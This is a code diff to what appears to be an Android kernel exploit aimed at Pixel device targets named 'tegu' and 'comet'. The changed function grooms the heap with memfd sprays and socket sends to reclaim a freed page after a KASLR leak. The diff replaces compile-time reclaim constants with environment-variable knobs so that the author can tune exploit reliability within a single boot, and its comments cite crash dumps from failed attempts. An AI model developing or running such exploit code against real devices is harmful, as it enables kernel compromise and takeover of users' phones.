@@ -726,6 +726,34 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   int pcp_shaping_sv[2];
   SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv));
 
+  // The three reclaim knobs are target.h #defines, which means every
+  // combination costs a rebuild. That is the wrong shape for tegu: a KASLR
+  // base is only good for the boot that leaked it, and on this device winning
+  // the slide to get one takes several reboots, so a rebuild in the middle of
+  // an experiment throws the base away and the sweep starts over. Read them
+  // from the environment instead, defaulting to the target's own values, so a
+  // single build can A/B all of them inside one boot.
+  //
+  // Worth doing because upstream's comet target — Pixel 9 Pro Fold, tested
+  // working, offsets extracted from this very tegu vmlinux — sets none of
+  // them and runs on the code defaults (0/0/4), while tegu carries 1/1/12.
+  // All three shape the reclaim the FOPS route depends on, and the FOPS route
+  // is the one that has never worked here.
+  //
+  // Each is read once and reused: the paired if/else arms below must agree,
+  // or a knob flipped between them would both skip and repeat a close().
+  int reclaim_spray_after_free =
+      env_flag("RECLAIM_SPRAY_AFTER_LEAK_FREE", RECLAIM_SPRAY_AFTER_LEAK_FREE);
+  int reclaim_keep_pcp =
+      env_flag("RECLAIM_KEEP_PCP_SHAPING", RECLAIM_KEEP_PCP_SHAPING);
+  int reclaim_sends =
+      env_int_range("SKB_RECLAIM_SENDS", SKB_RECLAIM_SENDS, 0, 1024);
+  pr_info("reclaim config payload=%d spray_after_free=%d keep_pcp=%d sends=%d "
+          "(target defaults %d/%d/%d)\n",
+          payload_mode, reclaim_spray_after_free, reclaim_keep_pcp,
+          reclaim_sends, RECLAIM_SPRAY_AFTER_LEAK_FREE,
+          RECLAIM_KEEP_PCP_SHAPING, SKB_RECLAIM_SENDS);
+
   struct iovec iov;
   memset(&iov, 0, sizeof(iov));
   iov.iov_base = skb_buf;
@@ -760,7 +788,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   // reaching the page allocator, so the reclaim sends cannot win the page no
   // matter how many of them there are. Measured on tegu, where the panic dumps
   // had fake_lock + 0x10 reading a live mm_struct's data_vm.
-  if (!RECLAIM_SPRAY_AFTER_LEAK_FREE) {
+  if (!reclaim_spray_after_free) {
     for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
       SYSCHK(close(spray_ctx.memfds[i]));
       spray_ctx.memfds[i] = -1;
@@ -773,7 +801,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   // allocating — so the first reclaim send never asks the page allocator for
   // anything. Keep it queued until the sends are done to force each one to
   // allocate.
-  if (!RECLAIM_KEEP_PCP_SHAPING) {
+  if (!reclaim_keep_pcp) {
     SYSCHK(close(pcp_shaping_sv[0]));
     SYSCHK(close(pcp_shaping_sv[1]));
   }
@@ -783,20 +811,20 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   sched_yield();
   SYSCHK(close(memfd_leak));
   memfd_leak = -1;
-  if (RECLAIM_SPRAY_AFTER_LEAK_FREE) {
+  if (reclaim_spray_after_free) {
     for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
       SYSCHK(close(spray_ctx.memfds[i]));
       spray_ctx.memfds[i] = -1;
     }
   }
-  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
+  for (int i = 0; i < reclaim_sends; i++) {
     errno = 0;
     ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
     if (sent <= 0) {
       break;
     }
   }
-  if (RECLAIM_KEEP_PCP_SHAPING) {
+  if (reclaim_keep_pcp) {
     SYSCHK(close(pcp_shaping_sv[0]));
     SYSCHK(close(pcp_shaping_sv[1]));
   }
